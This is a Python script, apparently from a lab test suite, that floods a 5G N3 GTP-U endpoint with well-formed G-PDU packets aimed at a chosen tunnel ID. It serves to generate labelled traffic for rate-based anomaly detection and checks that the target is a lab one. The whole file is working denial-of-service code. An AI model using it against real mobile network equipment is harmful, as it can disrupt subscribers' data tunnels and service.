#!/usr/bin/env python3
"""N3 GTP-U tunnel flood (label: gtpu_flood).

Injects a high rate of well-formed G-PDU packets toward a target TEID to
exercise per-tunnel rate/volume detection. Well-formed on purpose: the anomaly
here is *volume/rate*, not structure — a different feature signature than
malformed_gtpu.py.

Lab-only. See ../_common.py.
"""
import os, sys, time, struct, socket
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from _common import base_parser, assert_lab_target  # noqa: E402

GTPU_PORT = 2152
GTPU_GPDU = 0xFF


def gpdu(teid: int, payload: bytes) -> bytes:
    flags = 0x30  # version=1, PT=1, no optional fields
    return struct.pack("!BBHI", flags, GTPU_GPDU, len(payload), teid) + payload


def main() -> None:
    parser = base_parser(__doc__, GTPU_PORT)
    parser.add_argument("--teid", type=lambda x: int(x, 0), default=0x1,
                        help="target TEID to flood (default 0x1)")
    parser.add_argument("--size", type=int, default=512, help="inner payload bytes")
    args = parser.parse_args()
    assert_lab_target(args.target, args.ack)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x45" + b"\x00" * (args.size - 1)   # crude inner IP-ish filler
    pkt = gpdu(args.teid, payload)
    interval = 1.0 / args.rate if args.rate > 0 else 0
    print(f"[gtpu_flood] -> {args.target}:{args.port} teid={hex(args.teid)} "
          f"count={args.count} rate~{args.rate}/s size={args.size}")
    t0 = time.time()
    for _ in range(args.count):
        sock.sendto(pkt, (args.target, args.port))
        if interval:
            time.sleep(interval)
    dt = time.time() - t0
    print(f"[gtpu_flood] sent {args.count} in {dt:.1f}s (~{args.count/max(dt,1e-9):.0f}/s)")


if __name__ == "__main__":
    main()
